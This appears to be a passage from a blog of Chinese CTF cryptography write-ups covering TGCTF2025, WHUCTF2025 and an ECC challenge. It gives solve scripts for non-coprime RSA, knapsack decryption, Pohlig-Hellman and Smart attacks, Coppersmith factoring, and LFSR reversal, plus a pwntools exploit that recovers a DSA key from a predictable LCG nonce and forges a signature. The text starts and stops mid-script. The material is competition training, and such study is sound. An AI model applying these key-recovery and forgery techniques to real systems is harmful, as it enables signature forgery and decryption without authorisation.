74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776e=65536for i in range(1,1000):    k = pow(e,i,n)    Pr2 = problem2//k    # print(isinstance(Pr2,int))    sum = problem1+Pr2    sub = Pr2 - problem1    if sub&gt;0 :        q = GCD(sub,n)        print(q)# 爆破p q#p = 9586253455468582613875015189854230646329578628731744411408644831684238720919107792959420247980417763684885397749546095133107188260274536708721056484419031#q = 8998523072192453101232205847855618180700579235012899613083663121402246420191771909612939404791268078655630846054784775118256720627970477420936836352759291\n然后这里e是65536，不和phi互素，gcd是4，就考虑有限域开根然后用crt算可能的解了，脚本如下\n  from Crypto.Util.number import *from math import gcdfrom sage.all import *# 给定参数p = 9586253455468582613875015189854230646329578628731744411408644831684238720919107792959420247980417763684885397749546095133107188260274536708721056484419031q = 8998523072192453101232205847855618180700579235012899613083663121402246420191771909612939404791268078655630846054784775118256720627970477420936836352759291n = p * qe = 65536c = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776possible_m = []def decrypt_rsa_with_coprime_e(p, q, e, c):    # 计算模p和模q的c值    c_p = c % p    c_q = c % q    # 处理模p下的解    s_p = (p - 1) // 2  # 因为p-1的2的指数为1    d_p = pow(e, -1, s_p)    m_p = pow(c_p, d_p, p)    solutions_p = [m_p, (-m_p) % p]    # 处理模q下的解    s_q = (q - 1) // 2  # q-1的2的指数为1    d_q = pow(e, -1, s_q)    m_q = pow(c_q, d_q, q)    solutions_q = [m_q, (-m_q) % q]    # 使用CRT组合所有可能的解    from itertools import product    possible_m = []    for mp, mq in product(solutions_p, solutions_q):        m = CRT([mp, mq], [p, q])        possible_m.append(m)    return possible_m    # 执行解密possible_m = decrypt_rsa_with_coprime_e(p, q, e, c)for m in possible_m:    print(long_to_bytes(m))# b'CRYPTO_ALGORIT'\n不过跑出来b’CRYPTO_ALGORIT’就是第一个，有可能开根也能做呢\n\n\npart2\n背包加密，不过该给的都给了，按照加密过程反过来写很快就能搞出来\nfrom Crypto.Util.number import long_to_bytesimport math# 已知参数R = [10, 29, 83, 227, 506, 1372, 3042, 6163]A = 1253412688290469788410859162653B = 16036M = [10294, 12213, 10071, 4359, 1310, 4376, 7622, 14783]S_list = [13523, 32682, 38977, 44663, 43353, 31372, 17899, 17899, 44663, 16589, 40304, 25521, 31372]def backpack_decrypt(S_list, A, B, M):    # 1. 验证A与B互质    assert math.gcd(A, B) == 1, \"A and B must be coprime\"        # 2. 计算A的模逆元    inv_A = pow(A, -1, B)        # 3. 恢复超递增序列R    R_recovered = [(m * inv_A) % B for m in M]    print(\"恢复的R:\", R_recovered)  # 应等于原始R        # 4. 解密每个S值    bits = []    for S in S_list:        # 将S转换为超递增背包问题        S_prime = (S * inv_A) % B                # 贪心算法解背包        group = []        remaining = S_prime        for r in reversed(R_recovered):            if remaining &gt;= r:                group.append(1)                remaining -= r            else:                group.append(0)        bits.extend(group[::-1])  # 反转后加入        # 5. 转换二进制为字节    bytes_data = b''    for i in range(0, len(bits), 8):        byte_bits = bits[i:i+8]        if len(byte_bits) &lt; 8:            byte_bits += [0]*(8 - len(byte_bits))        byte = int(''.join(map(str, byte_bits)), 2)        bytes_data += bytes([byte])        # 6. 去除填充的零    return bytes_data.rstrip(b'\\x00')# 执行解密flag2 = backpack_decrypt(S_list, A, B, M)print(\"解密结果:\", flag2.decode())# HMS_WELL_DONE\n最后对两个flag拼接之后取md5，flag{64f67374264b7621650b1de4dbc5f924}\n\n\n 4.merge_ECC\n#t.sageimport randomfrom sympy import nextprimedef part1():    p = random_prime(2^512, 2^513)    a = random.randint(0, p-1)    b = random.randint(0, p-1)    while (4 * a**3 + 27 * b**2) % p == 0:        a = random.randint(0, p-1)        b = random.randint(0, p-1)    E = EllipticCurve(GF(p), [a, b])#构造一个模p环下的关于a,b的椭圆曲线    P=E.random_point()#曲线上的随机一个点    n = [random.randint(1, 2**20) for _ in range(3)] #随机的一个点    assert part1=''.join([hex(i)[2:] for i in n])    cipher = [n[i] * P for i in range(3)]    print(f\"N = {p}\")    print(f\"a = {a}, b = {b}\")    print(f\"P = {P}\")    for i in range(3):        print(f\"cipher{i} = {cipher[i]}\")# CRTdef part2():    p =  839252355769732556552066312852886325703283133710701931092148932185749211043    a =  166868889451291853349533652847942310373752202024350091562181659031084638450    b =  168504858955716283284333002385667234985259576554000582655928538041193311381    P = E.random_point()    Q = key*P    print(\"p = \",p)    print(\"a = \",a)    print(\"b = \",b)    print(\"P = \",P)    print(\"Q = \",Q)    assert part2=keypart1()print(\"-------------------------------------------\")part2()assert flag=\"flag{\"+str(part1)+\"-\"+str(part2)+\"}\"\n考察的是有关ECC的两种特殊攻击方法\n\n\npart1\n攻击的思路是Pohlig-Hellman攻击，要求是曲线的阶有小因数，这里E.order计算出来是512位，丢yafu分解之后发现有7个因子，其中5个比较小，且全部乘起来之后是比nin_ini​要大的，因此我们就可以取小的5个因子来进行攻击，脚本如下\nfrom sage.all import *from Crypto.Util.number import *n = 8186762541745429544201163537921168767557829030115874801599552603320381728161178278432652391299286759969365150578265902315058515370390070500719061057476940print(n.bit_length())# 2*2*5*11*499*683*124696170958113532210068667*875618937758378886905025632349007870524674918888468835522805095350653442872611049093102429356717528012933133846029979343# 椭圆曲线参数p = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797a = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447b = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147E = EllipticCurve(GF(p), [a, b])# 生成元和密文点P = E(    6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323,    7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226)cipher0 = E(    4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861,    5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816)cipher1 = E(    2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875,    4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500)cipher2 = E(    1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638,    1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434)# 已知阶的分解（排除最后两个大因子）primes = [4, 5, 11, 499, 683]  # 2^2, 5, 11, 499, 683def pohlig_hellman(P, Q, primes):    dlogs = []    for fac in primes:        t = P.order() // fac        PP = t * P        QQ = t * Q        dlog = PP.discrete_log(QQ)  # 自动选择最佳算法        dlogs.append(dlog)        print(f\"Factor: {fac}, Discrete Log: {dlog}\")    return crt(dlogs, primes)# 计算三个离散对数print(\"计算n0:\")n0 = pohlig_hellman(P, cipher0, primes)print(\"\\n计算n1:\")n1 = pohlig_hellman(P, cipher1, primes)print(\"\\n计算n2:\")n2 = pohlig_hellman(P, cipher2, primes)# 验证结果assert cipher0 == n0 * Passert cipher1 == n1 * Passert cipher2 == n2 * P# 拼接结果part1 = hex(n0)[2:] + hex(n1)[2:] + hex(n2)[2:]print(\"\\n解密结果:\", part1)# f61bd9f152e65ac\n\n\npart2\nsmart攻击，这里曲线计算出来阶和模数相同，脚本如下\n  from sage.all import *from Crypto.Util.number import *from gmpy2 import *p =  839252355769732556552066312852886325703283133710701931092148932185749211043a =  166868889451291853349533652847942310373752202024350091562181659031084638450b =  168504858955716283284333002385667234985259576554000582655928538041193311381E = EllipticCurve(GF(p), [a, b])r = E.order()# 839252355769732556552066312852886325703283133710701931092148932185749211043print(r)P =  E(547842233959736088159936218561804098153493246314301816190854370687622130932 , 259351987899983557442340376413545600148150183183773375317113786808135411950 )Q =  E(52509027983019069214323702207915994504051708473855890224511139305828303028 , 520507172059483331872189759719244369795616990414416040196069632909579234481 )def SmartAttack(P,Q,p):    E = P.curve()    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)    for P_Qp in P_Qps:        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:            break    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)    for Q_Qp in Q_Qps:        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:            break    p_times_P = p*P_Qp    p_times_Q = p*Q_Qp    x_P,y_P = p_times_P.xy()    x_Q,y_Q = p_times_Q.xy()    phi_P = -(x_P/y_P)    phi_Q = -(x_Q/y_Q)    k = phi_Q/phi_P    return ZZ(k)r = SmartAttack(P, Q, p)print(r)# 7895892011\nflag{f61bd9f152e65ac-7895892011}\n\n\n *5.logos\n2023赣政杯原题，这里是别的师傅写的博客2023赣政杯 — Crypto_赣政杯2023-CSDN博客\n还在被sagemath各种环境问题折磨，就暂时不细写了\n","categories":["WP"],"tags":["CTF","DLP","Crypto","ECC"]},{"title":"TGCTF2025","url":"/2025/04/22/TGCTF2025/","content":" EZRSA\nfrom secrets import flag, get_random_emojiiiiiifrom Crypto.Util.number import *def genarate_emojiiiiii_prime(nbits, base=0):    while True:        p = getPrime(base // 32 * 32) if base &gt;= 3 else 0        for i in range(nbits // 8 // 4 - base // 32):            p = (p &lt;&lt; 32) + get_random_emojiiiiii() # 猜一猜        if isPrime(p):            return pm = bytes_to_long(flag.encode()+ \"\".join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())p = genarate_emojiiiiii_prime(512, 224)q = genarate_emojiiiiii_prime(512)n = p * qe = \"💯\"c = pow(m, bytes_to_long(e.encode()), n)print(\"p0 =\", long_to_bytes(p % 2 ** 256).decode())print(\"n =\", n)print(\"c =\", c)# p0 = 😘😾😂😋😶😾😳😷# n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579# c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401\n从\np = genarate_emojiiiiii_prime(512, 224)q = genarate_emojiiiiii_prime(512)\n切入，结合这个函数，不难分析出，q就是18个emoji块，而p的第288位都是emoji块（共8个），而p已知低256位，并且观察生成p的emoji块的组成，十位数表示都是40369911??所以说只用爆破第八个emoji的最后2位，即可得到p的低288位，然后对高位再打一组copper，此时是可以解的，解出来，这里copper的思路是，当x确定，在GF(n)GF(n)\\\\GF(n)我们可以用多项式\np=f(x)=x∗2288+(a+i)∗2256+pp≡0\np=f(x)=x*2^{288}+(a+i)*2^{256}+pp\\equiv0\\\\\n\np=f(x)=x∗2288+(a+i)∗2256+pp≡0\n来约束x,从而copper出可能的值，再用整除性验证即可，脚本如下\nfrom Crypto.Util.number import *from tqdm import tqdmp0 = \"😘😾😂😋😶😾😳😷\"n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401e = \"💯\"ee = bytes_to_long(e.encode())a=4036991100pp = bytes_to_long(p0.encode())for i in tqdm(range(100)):    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    f = x * 2^288 + pp + (a+i) * 2^256    f = f.monic()    roots = f.small_roots(X=2^224, beta=0.4, eplison=0.04)    if roots:        x = roots[0]        p_may = int(x * 2^288 + pp + (a+i) * 2^256)        if n%p_may == 0:            print(\"p_may = \", p_may)            print(\"q_may = \", n // p_may)            break# p_may =  12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311# q_may =  12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989# 用时0.2s\n解出p,q之后就是e,phi不互素的RSA了,感谢不知道战队的师傅提供的一种简洁的写法TGCTF25 不知道 WP | 不知道のblog (idontknowctf.xyz)\nphi = (p-1)*(q-1)# GCD = gcd(ee, phi)  15d = inverse(ee//15, phi)c = pow(c, d, n)R.&lt;y&gt;=Zmod(p)[]f=y^15-cf=f.monic()m1=f.roots()R.&lt;z&gt;=Zmod(q)[]f=z^15-cf=f.monic()m2=f.roots()for i in m1:    for j in m2:        m=crt([int(i[0]),int(j[0])],[int(p),int(q)])        # print(long_to_bytes(int(m)))        if b'TGCTF' in long_to_bytes(int(m)):            print(long_to_bytes(int(m)).decode())# TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢\n LLLCG\nfrom hashlib import sha256from Crypto.Util.number import getPrime, inverse, bytes_to_long, isPrimefrom random import randintimport socketserverfrom secret import flag, dsa_p, dsa_qclass TripleLCG:    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):        self.state = [seed1, seed2, seed3]        self.a = a        self.b = b        self.c = c        self.d = d        self.n = n    def next(self):        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n        self.state.append(new)        return newclass DSA:    def __init__(self):        # while True:            # self.q = getPrime(160)            # t = 2 * getPrime(1024 - 160) * self.q            # if isPrime(t + 1):            #    self.p = t + 1            #    break        self.p = dsa_p        self.q = dsa_q        self.g = pow(2, (self.p - 1) // self.q, self.p)        self.x = randint(1, self.q - 1)        self.y = pow(self.g, self.x, self.p)    def sign(self, msg, k):        h = bytes_to_long(sha256(msg).digest())        r = pow(self.g, k, self.p) % self.q        s = (inverse(k, self.q) * (h + self.x * r)) % self.q        return (r, s)    def verify(self, msg, r, s):        if not (0 &lt; r &lt; self.q and 0 &lt; s &lt; self.q):            return False        h = bytes_to_long(sha256(msg).digest())        w = inverse(s, self.q)        u1 = (h * w) % self.q        u2 = (r * w) % self.q        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q        return v == rclass Task(socketserver.BaseRequestHandler):    def _recvall(self):        BUFF_SIZE = 2048        data = b''        while True:            part = self.request.recv(BUFF_SIZE)            data += part            if len(part) &lt; BUFF_SIZE:                break        return data.strip()    def send(self, msg, newline=True):        if newline:            msg += b'\\n'        self.request.sendall(msg)    def recv(self, prompt=b'[-] '):        self.send(prompt, newline=False)        return self._recvall()    def handle(self):        n = getPrime(128)        a, b, c, d = [randint(1, n - 1) for _ in range(4)]        seed1, seed2, seed3 = [randint(1, n - 1) for _ in range(3)]        lcg = TripleLCG(seed1, seed2, seed3, a, b, c, d, n)        dsa = DSA()        self.send(b\"Welcome to TGCTF Challenge!\\n\")        self.send(f\"p = {dsa.p}, q = {dsa.q}, g = {dsa.g}, y = {dsa.y}\".encode())        small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]        used_messages = set()        for o_v in range(3):            self.send(b\"Select challenge parts: 1, 2, 3\\n\")            parts = self.recv().decode().split()            if '1' in parts:                self.send(b\"Part 1\\n\")                for i in range(12):                    self.send(f\"Message {i + 1}: \".encode())                    msg = self.recv()                    used_messages.add(msg)                    k = lcg.next()                    r, s = dsa.sign(msg, k)                    self.send(f\"r = {r}, ks = {[k % p for p in small_primes]}\\n\".encode())            if '2' in parts:                self.send(b\"Part 2\\n\")                for _ in range(307):                    k = lcg.next()                for i in range(10):                    self.send(f\"Message {i + 1}: \".encode())                    msg = self.recv()                    k = lcg.next() % dsa.q                    r, s = dsa.sign(msg, k)                    self.send(f\"Signature: r = {r}, s = {s}\\n\".encode())                    used_messages.add(msg)            if '3' in parts:                self.send(b\"Part 3\\n\")                self.send(b\"Forged message: \")                final_msg = self.recv()                self.send(b\"Forged r: \")                r = int(self.recv())                self.send(b\"Forged s: \")                s = int(self.recv())                if final_msg in used_messages:                    self.send(b\"Message already signed!\\n\")                elif dsa.verify(final_msg, r, s):                    self.send(f\"Good! Your flag: {flag}\\n\".encode())                else:                    self.send(b\"Invalid signature.\\n\")###Welcome to TGCTF Challenge!p = 184352699172192576270535944394450689601424152593934253476634864667530549943623545663040121406222033469867822007490624607150449533351028007649079671823930639894259153639431593427418637301705583834256344087212849054820629604266938603002612952530534395948672534275310804229044744624757608906107492972246321630467, q = 1427475768627039429244287846531087092897981204933, g = 179483243075904419855912998377411172058265425529332248345132802466991524049692135618377118498301129461020930474539980424661227889497234584809425572665861532126589551010542468047939006056449514768312598585142121764108071687257917794156000007175743318015987068492602701013540262918705248846831651675444456948643, y = 65387748521549843710283006626280200692251144711420678211108890034468688391999964987744284367851744917929187743649125947284992180212308979307495115040557673902928236192043216997090684739998860758466653879269647032285760519012600075468974154258734633743042931772136088467213651982608545621578498333319665003265Select challenge parts: 1, 2, 3###\n数字签名问题，题干给出了一个三重LCG计算类，计算公式是\nsi+3≡asi+bsi+1+csi+2+d  mod  n\ns_{i+3}\\equiv as_{i}+bs_{i+1}+cs_{i+2}+d\\;mod\\;n\\\\\n\nsi+3​≡asi​+bsi+1​+csi+2​+dmodn\ns1=seed1  s2=seed2  s2=seed2\ns_1=seed_1\\;s_2=seed_2\\;s_2=seed_2\\\\\n\ns1​=seed1​s2​=seed2​s2​=seed2​\n\n我们先看part1，我们每输入一个msgmsgmsg，都会生成一个kik_iki​,并且用kik_iki​进行签名，然后再输出\n\n[ki  mod  pj,....](0&lt;j&lt;10)\n[k_i\\;mod\\;p_j,....](0&lt;j&lt;10)\\\\\n\n[ki​modpj​,....](0&lt;j&lt;10)\n注意到已经给了DSA中的q = 1427475768627039429244287846531087092897981204933,这很小，所以我们可以每次都打CRT来恢复kik_iki​,就这样，我们能恢复12组kik_iki​ 也就是说我们获得了这个三重LCG的连续12轮输出\n这样之后，使用groebner方法来解关于a,b,c,d线性同余方程组，这样我们就打穿了这个LCG,\n\n再看向part2,先进行了307次LCG，但是对我们就是白盒，所以这里全程k我们都是知道的，我们回顾一下DSA签名的流程\n\nr≡(gk  mod  p)  mod  q\nr\\equiv(g^k\\;mod\\;p)\\;mod\\;q\\\\\n\nr≡(gkmodp)modq\ns≡(k−1(h+xr))  mod  q\ns\\equiv(k^{-1}(h+xr))\\;mod\\;q\\\\\n\ns≡(k−1(h+xr))modq\n这里h=hash(msg)h=hash(msg)h=hash(msg),(r,s)(r,s)(r,s)就是签名rrr代表签名的随机性kkk,sss代表签名的唯一性xxx,然后就是验证签名过程,假设传达到的明文是msgmsgmsg,传过去的签名是(r0,s0)(r_0,s_0)(r0​,s0​),那么\nh=hash(msg)\nh=hash(msg)\\\\\n\nh=hash(msg)\nw≡s−1  mod  p\nw\\equiv s^{-1}\\;mod\\;p\\\\\n\nw≡s−1modp\nu1≡h∗w  mod  p\nu_1\\equiv h*w\\;mod\\;p\\\\\n\nu1​≡h∗wmodp\nu2≡r0∗w  mod  p\nu_2\\equiv r_0*w\\;mod\\;p\\\\\n\nu2​≡r0​∗wmodp\n再计算验证值\nv≡((gu1∗yu2)  mod  p)  mod  q\nv\\equiv((g^{u_1}*y^{u_2})\\;mod\\;p)\\;mod\\;q\\\\\n\nv≡((gu1​∗yu2​)modp)modq\n如果\nv=r0\nv=r_0\\\\\n\nv=r0​\n则验证成立，可见这里的验证方式只需要公钥yyy\n说回题目，part2给我们了10组(ri,si)(r_i,s_i)(ri​,si​)，我们不难推出\nx≡si∗k−hri  mod  p  (i=1,2...)\nx\\equiv\\frac{s_i*k-h}{r_i}\\;mod\\;p\\;(i=1,2...)\n\nx≡ri​si​∗k−h​modp(i=1,2...)\n解出x可以说绰绰有余了，\n\n最后是part3,我们只需按照上面的流程跑一遍，就能获得flag了，还是参考不知道战队师傅的wp，非常感谢！exp如下\n\nfrom pwn import *from Crypto.Util.number import *from hashlib import sha256sh=remote(\"127.0.0.1\",5153)context.log_level='debug'small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]class TripleLCG:    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):        self.state = [seed1, seed2, seed3]        self.a = a        self.b = b        self.c = c        self.d = d        self.n = n    def next(self):        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n        self.state.append(new)        return newclass DSA:    def __init__(self):        # while True:            # self.q = getPrime(160)            # t = 2 * getPrime(1024 - 160) * self.q            # if isPrime(t + 1):            #    self.p = t + 1            #    break        self.p = dsa_p        self.q = dsa_q        self.g = pow(2, (self.p - 1) // self.q, self.p)        self.x = randint(1, self.q - 1)        self.y = pow(self.g, self.x, self.p)    def sign(self, msg, k):        h = bytes_to_long(sha256(msg).digest())        r = pow(self.g, k, self.p) % self.q        s = (inverse(k, self.q) * (h + self.x * r)) % self.q        return (r, s)    def verify(self, msg, r, s):        if not (0 &lt; r &lt; self.q and 0 &lt; s &lt; self.q):            return False        h = bytes_to_long(sha256(msg).digest())        w = inverse(s, self.q)        u1 = (h * w) % self.q        u2 = (r * w) % self.q        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q        return v == r# -------------------------------------------------# get pqgysh.recvuntil(b'!\\n')sh.recvuntil(b'\\n')sh.recvuntil(b'p = ')p=int(sh.recvuntil(b',').decode()[:-1])print('p = ',p)sh.recvuntil(b'q = ')q=int(sh.recvuntil(b',').decode()[:-1])print('q = ',q)sh.recvuntil(b'g = ')g=int(sh.recvuntil(b',').decode()[:-1])print('g = ',g)sh.recvuntil(b'y = ')y=int(sh.recvuntil(b'\\n').decode()[:-1])print('y = ',y)print('----------------------------------------------------')# part 1sh.recvuntil(b'] ')sh.sendline(b'1')r_l=[]ks_l=[]for i in range(12):    sh.recvuntil(b'] ')    sh.sendline(b'1')    sh.recvuntil(b'r = ')    r=int(sh.recvuntil(b',').decode()[:-1])    print('r = ',r)    sh.recvuntil(b'ks = ')    ks=eval(sh.recvuntil(b'\\n').decode()[:-1])    print('ks = ',ks)    r_l.append(r)    ks_l.append(ks)print(r_l,ks_l)from libnum import *def recover_k(residues):        return solve_crt(residues,small_primes)k_ = [recover_k(i) for i in ks_l]print(k_)#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]R.&lt;a,b,c,d&gt; = PolynomialRing(ZZ)f1=k_[0]*a+k_[1]*b+k_[2]*c+d-k_[3]f2=k_[1]*a+k_[2]*b+k_[3]*c+d-k_[4]f3=k_[2]*a+k_[3]*b+k_[4]*c+d-k_[5]f4=k_[3]*a+k_[4]*b+k_[5]*c+d-k_[6]f5=k_[4]*a+k_[5]*b+k_[6]*c+d-k_[7]f6=k_[5]*a+k_[6]*b+k_[7]*c+d-k_[8]f7=k_[6]*a+k_[7]*b+k_[8]*c+d-k_[9]f8=k_[7]*a+k_[8]*b+k_[9]*c+d-k_[10]f9=k_[8]*a+k_[9]*b+k_[10]*c+d-k_[11]F=[f1,f2,f3,f4,f5,f6,f7,f8,f9]ideal = Ideal(F)I = ideal.groebner_basis()print(I)n = int(I[4])a = int(-I[0].univariate_polynomial()(0))%nb = int(-I[1].univariate_polynomial()(0))%nc = int(-I[2].univariate_polynomial()(0))%nd = int(-I[3].univariate_polynomial()(0))%nprint(a,b,c,d,n)print(a.bit_length(),b.bit_length(),c.bit_length(),d.bit_length(),n.bit_length())lcg=TripleLCG(k_[-3],k_[-2],k_[-1],a,b,c,d,n)print('--------------------------------------------------')#part 2sh.recvuntil(b'] ')sh.sendline(b'2')sh.recvuntil(b' 2\\n')for _ in range(307):    k = lcg.next()r_l2 = []s_l = []for i in range(10):    sh.recvuntil(b'] ')    sh.sendline(b'a')    sh.recvuntil(b'r = ')    r=int(sh.recvuntil(b',').decode()[:-1])    print('r = ',r)    sh.recvuntil(b's = ')    s=int(sh.recvuntil(b'\\n').decode()[:-1])    print('s = ',s)    r_l2.append(r)    s_l.append(s)print(r_l2,s_l)print(len(r_l2),len(s_l))m = b'a'h = bytes_to_long(sha256(m).digest())k = lcg.next()print('k=',k)inv_r=inverse(r_l2[0],q)x = ((s_l[0]*k%q-h)*inv_r) % qprint(x)print(\"------------------------------------------\")#part 3sh.recvuntil(b'] ')sh.sendline(b'3')end_m=b'b'sh.recvuntil(b'e: ')sh.sendline(end_m)end_h = bytes_to_long(sha256(b'b').digest())r_ = pow(g,1,p)%qs_ = ((end_h+x*r_)*inverse(1,q))%qprint(r_,s_)sh.recvuntil(b'r: ')sh.sendline(str(r_).encode())sh.recvuntil(b's: ')sh.sendline(str(s_).encode())sh.recvlines()sh.interactive()\n\n","categories":["复现"],"tags":["CTF","RSA","LCG","DSA"]},{"title":"WHUCTF2025","url":"/2025/04/14/WHUCTF2025/","content":" WHUCTF2025复盘\n\n\n\n LSFR_Signin\n\n\n原题代码如下\nfrom Crypto.Util.number import *flag = b\"whuctf{}\"flag = list(bin(bytes_to_long(flag))[2:])assert(len(flag) == 255)for i in range(len(flag)):    flag[i] = int(flag[i])for i in range(2025):    flag.append(flag[i] ^ flag[i+20] ^ flag[i+25] ^ flag[i+250] ^ flag[-1])    print(flag[-1], end=\"\")\n已知flag为255位，对于线性寄存器，根据i i+20 i+25 i+250 以及最后一位就能解出下一位，于是我们从第256位开始往后，有\nflagi=flagi+20xorflagi+25xorflagi+250xorflagi+254xorflagi+256\nflag_i = flag_{i+20} xor flag_{i+25}xorflag_{i+250}xorflag_{i+254}xorflag_{i+256}\n\nflagi​=flagi+20​xorflagi+25​xorflagi+250​xorflagi+254​xorflagi+256​\ni取0到254，而我们已知2552280位，取255510位来解密就可以，脚本如下\nfrom Crypto.Util.number import long_to_bytes# 初始化长度为255的全0数组s = [0] * 255# 给定的01串bit_string = \"110000011011110000010101100011111101011011111111111111101011000111001010111000101111101100011011000110011000100010011111110111010110000111111111111101111011011101000000010011110010111000110100110011101110101010110001110100111001100011100001001000000011010011001101001000000000110110100101000110000011011100011100001000010001110000111110000110010001110001101011101110100011010000101101000000000001101111111001010100011110110001101010010100011010011010010110010110100011001100010010010110110010010001111010111100011101100001111111110101011010011111110101000110010000101011011101000000111000001011010010001010101101111111001100010001001011100100111000010100011001001111011110111111101100111001011100001110110110100010011010011111110010111001101000011000011111001101100111001111000010011110011111001010001111110001010100100011001000100011001010010111010000011101011001111111010010010101001010011010000010000100001010111000000000010011011110110001101010010101001010100100010110001001000101000001011111010110101110111100101001100101011000010000101010001010111010111010010110001111010000001101101100101111001010010010011010101110001101001111011010001000010111010011010001011011011000111101010001101110000100100011010011111110110000001101100010011000110100010101010010101100101011001001100010100111011101111100010111100010001101100101100111110101001111101000010110110011000111100110101001111001100110111100111111000101101101000011110011001101100111100111001001001001100101111101110111011111110110101000001100010110101101100100001110100110101100101011010101101101100011011000001111001010001110000110001001011001001110111110000001000011000011000101010101010010010100010011011000011100111011101111110100101111111001011010110010010011101011001011110001101110110110111110100000100001111100101000001101010000011001001100100010101111010100000010110010010111000000010010101001011001011001111001000100010100101000011110110101001011111011111001010111101111000001101101100101111010101100110000111011101100100000011001110011000110110100101010100\"# 将01串添加到数组后面for i in range(len(bit_string)):    s.append(int(bit_string[i]))# 从i=254开始向前计算for i in range(254, -1, -1):    s[i] = s[i+20] ^ s[i+25] ^ s[i+250] ^ s[i+254] ^ s[i+255]# 截取前255位并转换为字符串result_bits = ''.join(str(bit) for bit in s[:255])# 转换为长整型然后转为字节result_long = int(result_bits, 2)result_bytes = long_to_bytes(result_long)print(result_bytes)#whuctf{quit3_ea5y_Sign1n_R1ght?}\n\n\n RSAASR\n\n\n题干：\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_long, long_to_bytesdef generate(bit):    while True:        p = getPrime(bit)        q = rev(p)        if isPrime(q):            break    return p, qrev = lambda x: int(bin(x)[:1:-1], 2)  # 二进制反转整数flag = b\"??????\"p, q = generate(512)n = p * qe = 65537c = pow(bytes_to_long(flag), e, n)print(f\"n={n}\")print(f\"e={e}\")print(f\"c={c}\")\np和q二进制颠倒，采用爆破的思路，同时估计p q的范围，并且每次取p q的低k位（k为已经爆破出来的位）相乘，对结果取低k位，如果和n的低k位相同就继续，不同就剪去，代码如下，板子参照博客：Crypto趣题-剪枝 | 糖醋小鸡块的blog (tangcuxiaojikuai.xyz)\nfrom Crypto.Util.number import *import syssys.setrecursionlimit(1500)n=89260288112458610375700543707493254232809306221431627423709616690294586688526862549905410606087786699242563057156677052913617284849136716660502920085006747882186134482309361626185003661858419446057779826705477210404882478906671799290032009310469036065257789664458482249297907582602310789531951177426393110643e=65537c=34953739673730018843655174314108340461262205663805875643136393046216892771730195951086950749299233260612871271352091804579992550715616098448464010205976283620661044089962336249776561849400241337436006809354102892524119722533361144592982143227173415365371111087024439252557012289555411199194971295453523635612def find(ph,qh):    l = len(ph)    pl = qh[::-1]    ql = ph[::-1]    p_max = ph + (512-2*l)*'1' + pl    q_max = qh + (512-2*l)*'1' + ql    p_min = ph + (512-2*l)*'0' + pl    q_min = qh + 